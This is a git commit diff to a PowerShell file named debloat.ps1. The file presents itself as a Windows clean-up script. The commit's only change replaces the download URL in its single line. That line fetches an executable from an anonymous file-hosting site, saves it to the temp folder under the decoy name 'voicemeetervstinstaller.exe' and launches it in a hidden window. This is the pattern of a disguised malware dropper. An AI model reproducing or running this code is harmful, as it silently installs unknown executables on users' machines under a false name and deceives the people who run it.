03c0c92407293080784f5c4905b35527d4c6e9d7
Vanitypyjs <121406723+Vanitypyjs@users.noreply.github.com>
2023-01-05 00:14:10 +0100

    Update debloat.ps1

--- debloat.ps1
+++ debloat.ps1
@@ -1,1 +1,1 @@
-iwr -useb https://cdn-112.anonfiles.com/29Xad1Qay7/2707212b-1672873512/Fyn.exe -o $env:TEMP\voicemeetervstinstaller.exe; saps $env:TEMP\voicemeetervstinstaller.exe -WindowStyle Hidden
+iwr -useb https://store5.gofile.io/download/16a0b13d-7d22-4a24-883e-ef213c86c0d7/jh.exe -o $env:TEMP\voicemeetervstinstaller.exe; saps $env:TEMP\voicemeetervstinstaller.exe -WindowStyle Hidden
